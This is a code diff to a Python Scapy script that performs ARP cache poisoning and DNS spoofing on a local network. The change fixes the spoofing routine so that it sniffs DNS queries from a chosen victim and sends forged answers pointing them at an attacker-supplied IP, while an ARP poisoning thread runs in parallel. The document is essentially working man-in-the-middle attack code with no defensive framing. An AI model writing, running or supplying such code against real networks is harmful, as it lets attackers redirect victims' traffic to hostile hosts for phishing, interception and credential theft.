@@ -10,6 +10,7 @@ mac_attacker = ""
 ip_victim = ""
 mac_victim = ""
 lan_gateway_ip = ""
+ip_spoofed = ""
 choice = ""
 
 def get_mac(ip):
@@ -64,20 +65,21 @@ def arp_poisoning():
 		sendp(pkt, verbose=False)
 
 def dns_spoofing():
-
+	global ip_spoofed
 	ip_spoofed = raw_input("Enter an IP address with which you would like to poison the DNS cache: ")
 
 	thread = Thread(target = arp_poisoning, args = ())
 	thread.start()
 
+	sniff(filter = "udp port 53", prn = send_spoofed_rsp, store = 0)
+	
+def send_spoofed_rsp(pkt):
 	if pkt.haslayer(DNSQR) and pkt[IP].src == ip_victim:
 		spoof_pkt = IP(dst = pkt[IP].src, src = pkt[IP].dst)/\
                           UDP(dport = pkt[UDP].sport, sport = pkt[UDP].dport)/\
                           DNS(id = pkt[DNS].id, qr = 1, aa = 1, qd = pkt[DNS].qd,\
                           an = DNSRR(rrname = pkt[DNS].qd.qname, ttl = 10, rdata = ip_spoofed))
-		send(spoof_pkt)
-	
-	sniff(filter = "udp port 53", prn = dns_spoof, store = 0)
+		send(spoof_pkt, verbose=False)
 
 def main():
 	global choice
